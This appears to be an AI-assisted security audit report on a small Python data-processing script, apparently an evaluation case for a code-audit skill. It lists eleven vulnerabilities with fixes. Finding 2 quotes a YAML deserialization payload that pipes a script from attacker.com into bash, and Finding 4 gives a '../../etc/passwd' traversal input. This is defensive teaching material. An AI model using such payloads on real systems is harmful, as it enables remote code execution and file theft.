# Security Audit Report: case2_processor.py

**File:** `D:\code\agent\miko\miko\miko\data\skills\code-audit\evals\files\case2_processor.py`
**Audit Date:** 2026-06-18
**Severity Classification:**

| Level | Description |
|-------|-------------|
| CRITICAL | Immediate exploitation risk, remote code execution, credential exposure |
| HIGH | Significant data loss/leakage risk, requires non-trivial preconditions |
| MEDIUM | Weakened security posture, defense-in-depth concerns |
| LOW | Best-practice violations with limited direct exploitability |

---

## Executive Summary

This 84-line Python data processing script contains **11 distinct security vulnerabilities**, including **3 CRITICAL**, **4 HIGH**, **2 MEDIUM**, and **2 LOW** severity findings. The most severe issues include remote code execution via unsafe deserialization (YAML and Pickle), a hardcoded API token in source code, and a path traversal vulnerability in the file processing routine. The script is unsafe for production use in its current form.

---

## Finding 1: Hardcoded API Token in Source Code

| Attribute | Detail |
|-----------|--------|
| **Severity** | CRITICAL |
| **CWE** | CWE-798 (Use of Hard-coded Credentials) |
| **Location** | Line 14 |
| **Affected Code** | `API_TOKEN = 'sk-proj-abc123def456ghi789jkl'` |

### Description

A secret API token (`sk-proj-abc123def456ghi789jkl`) is hardcoded directly in the source code. This token is an OpenAI-style project API key. It is stored as a module-level constant and later assigned to `self.api_token` in the `DataProcessor.__init__` method (line 70).

### Risk

- Anyone with read access to the source code gains access to the API key.
- The token will be committed to version control history (git).
- The token is trivially discoverable via static analysis or even `grep`.
- If this token is valid, an attacker could use it to consume API quota, access associated resources, or exfiltrate data -- all billed to the owner's account.
- Token rotation requires a code change and redeployment.

### Remediation

```python
# Use environment variables or a secrets manager
import os
API_TOKEN = os.environ.get('API_TOKEN')
```

Or, better, use a dedicated secrets backend (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault). Never store secrets in source code. Rotate the exposed token immediately.

---

## Finding 2: Unsafe YAML Deserialization (Arbitrary Code Execution)

| Attribute | Detail |
|-----------|--------|
| **Severity** | CRITICAL |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **Location** | Line 20 |
| **Affected Code** | `return yaml.load(f)` |

### Description

The `load_config()` function calls `yaml.load(f)` without specifying a `Loader` argument. In PyYAML, when no `Loader` is provided, the default `Loader` class supports constructing arbitrary Python objects from specially crafted YAML input. This means an attacker who controls the contents of `/var/data/processor/config.yml` can achieve **arbitrary remote code execution**.

A malicious YAML payload could look like:

```yaml
!!python/object/apply:os.system ["curl http://attacker.com/shell.sh | bash"]
```

### Risk

- If an attacker can write to the configuration file (e.g., via another vulnerability, misconfiguration, or compromised upstream), they gain full code execution in the context of the Python process.
- The resulting command runs with whatever privileges the Python process has, which could be root if the service is poorly configured.

### Remediation

Use `yaml.safe_load()` instead:

```python
def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return yaml.safe_load(f)
```

`safe_load()` only deserializes primitive Python types (dict, list, str, int, float, bool, None) and blocks arbitrary object construction.

---

## Finding 3: Unsafe Pickle Deserialization (Arbitrary Code Execution)

| Attribute | Detail |
|-----------|--------|
| **Severity** | CRITICAL |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **Location** | Line 26 |
| **Affected Code** | `return pickle.load(f)` |

### Description

The `load_state()` function deserializes a pickle file via `pickle.load()` without any validation or sandboxing. The Python pickle format allows the serialized data to include arbitrary Python code that executes upon deserialization. This is a well-known and well-documented remote code execution vector.

Any process that can write a file to the path specified by `state_file` can craft a malicious pickle that executes arbitrary commands when the application calls `load_state()`.

### Risk

- **NIST NVD explicitly warns**: "The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source."
- If an attacker can place a malicious `.pkl` file at the expected path, they gain arbitrary code execution.
- Additionally, `save_state()` on line 31 uses `pickle.dump()` which, while not directly exploitable for RCE, perpetuates the unsafe storage format.

### Remediation

1. **Preferred:** Switch to a safe serialization format such as JSON:

```python
import json

def load_state(state_file):
    with open(state_file, 'r') as f:
        return json.load(f)

def save_state(state, state_file):
    with open(state_file, 'w') as f:
        json.dump(state, f)
```

2. **If pickle is unavoidable:** Combine with cryptographic signing (HMAC) to ensure integrity and authenticity, and only unpickle data you yourself signed. Even then, prefer alternatives.

---

## Finding 4: Path Traversal in process_file()

| Attribute | Detail |
|-----------|--------|
| **Severity** | HIGH |
| **CWE** | CWE-22 (Path Traversal) |
| **Location** | Lines 55-58 |
| **Affected Code** | `filepath = os.path.join(DATA_DIR, filename)` |

### Description

The `process_file()` function takes a `filename` argument and joins it with `DATA_DIR` using `os.path.join()`. If `filename` contains path traversal sequences (e.g., `../../etc/passwd`), `os.path.join()` will resolve the path above `DATA_DIR`, allowing an attacker to read arbitrary files on the filesystem.

Example attack input: `filename = "../../etc/passwd"` produces `filepath = "/var/data/processor/../../etc/passwd"` which resolves to `/etc/passwd`.

### Risk

- **Information disclosure:** An attacker can read `/etc/passwd`, `/etc/shadow` (if the process runs as root), SSH private keys, application source code, or environment files containing secrets.
- The content is returned in uppercase (line 58), but this is still trivially readable by reversing the case transformation.

### Remediation

Validate and sanitize the filename. Use `os.path.realpath()` to resolve and then verify the resolved path stays within the intended directory:

```python
def process_file(filename):
    filepath = os.path.realpath(os.path.join(DATA_DIR, filename))
    if not filepath.startswith(os.path.realpath(DATA_DIR) + os.sep):
        raise ValueError("Path traversal detected")
    with open(filepath, 'r') as f:
        content = f.read()
    return content.upper()
```

Alternatively, use `pathlib.Path.resolve()` with similar containment checks.

---

## Finding 5: Tar Slip / Zip Slip in extract_archive()

| Attribute | Detail |
|-----------|--------|
| **Severity** | HIGH |
| **CWE** | CWE-22 (Path Traversal via Archive Extraction) |
| **Location** | Lines 38-39 |
| **Affected Code** | `tar.extractall(path=dest_dir)` |

### Description

The `extract_archive()` function calls `tarfile.extractall()` without any member path sanitization. Maliciously crafted tar archives can contain entries with absolute paths (e.g., `/etc/cron.d/backdoor`) or path traversal sequences (e.g., `../../.ssh/authorized_keys`). In older Python versions (prior to a fix), `extractall()` does not prevent extraction to paths outside the destination directory.

### Risk

- **Arbitrary file write:** An attacker who can upload or supply a malicious tar.gz archive can overwrite critical system files.
- This can lead to privilege escalation (overwriting `authorized_keys`), persistence (writing cron jobs or systemd units), or code execution (overwriting Python modules or libraries).

### Remediation

1. **Use `extractall` with the `filter` argument** (Python 3.12+) or use `tarfile.data_filter`:

```python
with tarfile.open(archive_path, 'r:gz') as tar:
    tar.extractall(path=dest_dir, filter='data')
```

2. **For older Python versions**, manually iterate and validate each member:

```python
import os
def extract_archive(archive_path, dest_dir=None):
    if dest_dir is None:
        dest_dir = DATA_DIR
    dest_dir = os.path.realpath(dest_dir)
    with tarfile.open(archive_path, 'r:gz') as tar:
        for member in tar.getmembers():
            # Reject absolute paths
            if member.name.startswith('/'):
                raise ValueError(f"Absolute path in archive: {member.name}")
            # Reject traversal sequences
            member_path = os.path.realpath(os.path.join(dest_dir, member.name))
            if not member_path.startswith(dest_dir + os.sep):
                raise ValueError(f"Path traversal in archive: {member.name}")
            tar.extract(member, dest_dir)
```

---

## Finding 6: Insecure File Permissions on Output

| Attribute | Detail |
|-----------|--------|
| **Severity** | HIGH |
| **CWE** | CWE-732 (Incorrect Permission Assignment for Critical Resource) |
| **Location** | Line 77 |
| **Affected Code** | `os.chmod(output_path, 0o777)` |

### Description

The `DataProcessor.process()` method sets the output file permissions to `0o777` (world-readable, world-writable, world-executable). This means **any user on the system** can read, modify, or execute the output file.

### Risk

- **Data leakage:** Any local user can read the processed output, which may contain sensitive information.
- **Integrity compromise:** Any local user can modify the output file, causing downstream consumers to process tampered data.
- **Execution risk:** If the output file is later executed (e.g., as a script), any local user could have replaced it with malicious code.
- This is a violation of the principle of least privilege.

### Remediation

Use restrictive permissions appropriate for the use case:

```python
os.chmod(output_path, 0o600)  # Owner read+write only
# or
os.chmod(output_path, 0o640)  # Owner read+write, group read
```

Remove the `chmod` call entirely if the default `umask` is correctly configured. The default file creation mask is preferable to an explicit `0o777`.

---

## Finding 7: Weak Password Hashing (MD5 + Fixed Salt)

| Attribute | Detail |
|-----------|--------|
| **Severity** | HIGH |
| **CWE** | CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-760 (Use of a One-Way Hash with a Predictable Salt) |
| **Location** | Lines 42-45 |
| **Affected Code** | `hashlib.md5((salt + password).encode()).hexdigest()` with `salt = 'fixed-salt-123'` |

### Description

The `hash_password()` function has two critical weaknesses:

1. **MD5 is cryptographically broken.** It is fast to compute (enabling brute-force attacks) and has known collision vulnerabilities. NIST deprecated MD5 for cryptographic use over a decade ago.

2. **The salt is fixed and hardcoded.** A salt's purpose is to be unique per password so that identical passwords produce different hashes and pre-computed rainbow tables are defeated. A fixed, hardcoded salt defeats both purposes:
   - Identical passwords produce identical hashes (revealing password reuse).
   - An attacker can pre-compute a rainbow table for `fixed-salt-123` and crack all passwords at once.

3. **No key stretching.** MD5 is a single-iteration hash with no work factor. Modern GPUs can compute billions of MD5 hashes per second, making brute-force attacks trivial.

### Risk

- Password hashes can be cracked in seconds using readily available GPU-based tools (hashcat, John the Ripper).
- The fixed salt means one cracked password reveals all users with the same password.
- The hardcoded salt in source code means the attacker knows the salt immediately upon compromising the codebase.

### Remediation

Use a dedicated password hashing library with key stretching:

```python
import hashlib
import os

def hash_password(password):
    salt = os.urandom(16)  # Cryptographically random, per-password salt
    # Use PBKDF2 with 600,000+ iterations or preferably bcrypt/scrypt/argon2
    dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000)
    return salt.hex() + ':' + dk.hex()
```

Better yet, use the `bcrypt` or `argon2-cffi` libraries which handle salt generation, key stretching, and constant-time comparison automatically:

```python
import bcrypt

def hash_password(password):
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt())
```

---

## Finding 8: Unvalidated Environment Variables / Path Assumptions

| Attribute | Detail |
|-----------|--------|
| **Severity** | MEDIUM |
| **CWE** | CWE-73 (External Control of File Name or Path) |
| **Location** | Lines 12-13, 62-66 |
| **Affected Code** | `DATA_DIR = '/var/data/processor'` (hardcoded), `temp_dir = '/tmp/processor'` (hardcoded) |

### Description

The script assumes hardcoded directory paths exist and are correctly permissioned:

- `DATA_DIR = '/var/data/processor'` -- no existence check, no permission check.
- `temp_dir = '/tmp/processor'` -- no existence check.
- `cleanup_temp_files()` iterates `os.listdir(temp_dir)` without checking if the directory exists (crashes if absent) and blindly removes all files in it (destructive if misconfigured).

Additionally, `cleanup_temp_files()` only removes the contents of `/tmp/processor`, not the directory itself, and has no safeguards against symlink attacks where a file inside `/tmp/processor` might actually be a symlink to a critical system file.

### Risk

- If the hardcoded paths are wrong or the directories don't exist, the script crashes with unhandled exceptions.
- If `/tmp/processor` contains a symlink pointing to `/etc/passwd` or another critical file, `cleanup_temp_files()` will delete it (via `os.remove()` which follows symlinks).
- No input validation on `state_file`, `archive_path`, `input_path`, or `output_path` -- all accept arbitrary paths.

### Remediation

- Create directories if they don't exist: `os.makedirs(DATA_DIR, exist_ok=True)`
- Validate directory existence at startup.
- For `cleanup_temp_files()`, resolve symlinks and verify the real path is within the intended temp directory before removing:

```python
def cleanup_temp_files():
    temp_dir = os.path.realpath('/tmp/processor')
    if os.path.isdir(temp_dir):
        for f in os.listdir(temp_dir):
            fpath = os.path.realpath(os.path.join(temp_dir, f))
            if fpath.startswith(temp_dir + os.sep):
                os.remove(fpath)
```

---

## Finding 9: Predictable "Random" Token

| Attribute | Detail |
|-----------|--------|
| **Severity** | MEDIUM |
| **CWE** | CWE-338 (Use of Cryptographically Weak Pseudo-Random Number Generator) |
| **Location** | Lines 48-50 |
| **Affected Code** | `''.join(random.choice('abcdef0123456789') for _ in range(32))` |

### Description

The `generate_token()` function uses `random.choice()` from Python's `random` module. This module uses a **Mersenne Twister** PRNG, which is **not cryptographically secure**. Given enough output from the generator, an attacker can predict future (and past) outputs -- including API tokens.

Additionally, the character set only contains hexadecimal characters (`abcdef0123456789`), which means only 16 possible values per position. A 32-character hex token has 128 bits of nominal entropy, but combined with a predictable PRNG, this security is illusory.

### Risk

- An attacker who observes a few generated tokens can recover the internal state of the Mersenne Twister and predict all future tokens.
- If the PRNG is seeded from system time (Python's default behavior), an attacker who knows approximately when the process started can brute-force the seed and reproduce all generated tokens.

### Remediation

Use `secrets` module for cryptographically secure token generation:

```python
import secrets

def generate_token():
    return secrets.token_hex(16)  # 32 hex characters, 128 bits of entropy
```

---

## Finding 10: Unvalidated Input to process() Method

| Attribute | Detail |
|-----------|--------|
| **Severity** | LOW |
| **CWE** | CWE-20 (Improper Input Validation) |
| **Location** | Lines 73-80 |
| **Affected Code** | `DataProcessor.process()` accepts arbitrary `input_path` and `output_path` |

### Description

The `DataProcessor.process()` method accepts arbitrary file paths for `input_path` and `output_path` with no validation. Combined with the `chmod`/`open` calls, this means:
- An attacker can read any file on the system by passing its path as `input_path`.
- An attacker can write to or overwrite any file by passing its path as `output_path`.
- The file is then made world-readable/writable (see Finding 6).

The `_transform()` method does a simple string replacement (`'foo'` -> `'bar'`), so the data transformation itself is benign, but the unvalidated I/O is not.

### Risk

While less directly exploitable than `process_file()` (which has an explicit path traversal), this method still has no guardrails on file access.

### Remediation

Validate both paths to ensure they reside within the designated data directory, as described in Finding 4.

---

## Finding 11: Missing Exception Handling and Resource Management

| Attribute | Detail |
|-----------|--------|
| **Severity** | LOW |
| **CWE** | CWE-703 (Improper Check or Handling of Exceptional Conditions) |
| **Location** | Entire file (all I/O operations) |
| **Affected Code** | All `open()`, `os.listdir()`, `os.remove()`, `tarfile.open()` calls |

### Description

Throughout the script, file operations are performed without context managers (`with` is used for `open()` which is correct), but without any exception handling. If any I/O operation fails (file not found, permission denied, disk full), the script crashes with an unhandled exception and an unhelpful traceback.

Additionally, `cleanup_temp_files()` (lines 63-66) loops over `os.listdir()` results and calls `os.remove()` -- if a single removal fails (e.g., permission denied on one file), the entire loop aborts and remaining files are never cleaned up.

### Risk

- Service instability and potential DoS.
- Incomplete cleanup on partial failure.
- Information leakage via stack traces if exceptions are exposed to users/clients.

### Remediation

Wrap individual file operations in try/except blocks with appropriate logging:

```python
def cleanup_temp_files():
    temp_dir = '/tmp/processor'
    if not os.path.isdir(temp_dir):
        return
    for f in os.listdir(temp_dir):
        try:
            os.remove(os.path.join(temp_dir, f))
        except OSError as e:
            logging.warning(f"Failed to remove {f}: {e}")
```

---

## Summary of Findings

| # | Severity | Title | CWE | Line(s) |
|---|----------|-------|-----|---------|
| 1 | CRITICAL | Hardcoded API Token | CWE-798 | 14, 70 |
| 2 | CRITICAL | Unsafe YAML Deserialization (RCE) | CWE-502 | 20 |
| 3 | CRITICAL | Unsafe Pickle Deserialization (RCE) | CWE-502 | 26 |
| 4 | HIGH | Path Traversal in process_file() | CWE-22 | 55-56 |
| 5 | HIGH | Tar Slip in extract_archive() | CWE-22 | 38-39 |
| 6 | HIGH | World-Writable File Permissions (0o777) | CWE-732 | 77 |
| 7 | HIGH | Weak Password Hashing (MD5 + fixed salt) | CWE-327, CWE-760 | 42-45 |
| 8 | MEDIUM | Hardcoded Paths / No Path Validation | CWE-73 | 12-13, 62-63 |
| 9 | MEDIUM | Predictable Token Generation (insecure PRNG) | CWE-338 | 48-50 |
| 10 | LOW | Unvalidated Input to process() | CWE-20 | 73-80 |
| 11 | LOW | Missing Exception Handling | CWE-703 | Multiple |

## Risk Matrix

|   | Confidentiality | Integrity | Availability |
|---|---|---|---|
| **CRITICAL** | #1 (token leak) | #2, #3 (RCE via deserialization) | #2, #3 (RCE can DoS) |
| **HIGH** | #4 (path traversal), #7 (MD5) | #5 (tar slip), #6 (0o777 perms) | #4 (read sensitive files) |
| **MEDIUM** | #9 (token prediction) | #8 (TOCTOU/symlink) | #8 (crash on missing dir) |
| **LOW** | #10 (unvalidated input) | #11 (unhandled errors) | #11 (incomplete cleanup) |

## Overall Assessment

This script should **not be deployed in production** in its current state. While it is only 84 lines, it contains a high density of severe vulnerabilities. The three CRITICAL findings (hardcoded token, unsafe YAML, unsafe pickle) are each individually sufficient to compromise the host system. The recommended remediation for all findings is included above, but the minimum actions before any production use are:

1. Remove the hardcoded API token and rotate it immediately.
2. Replace `yaml.load()` with `yaml.safe_load()`.
3. Replace `pickle.load()` with `json.load()` or add cryptographic integrity verification.
4. Validate paths against path traversal in `process_file()` and `extract_archive()`.
5. Remove the `os.chmod(output_path, 0o777)` call.
6. Replace MD5 with bcrypt/argon2/PBKDF2 for password hashing.
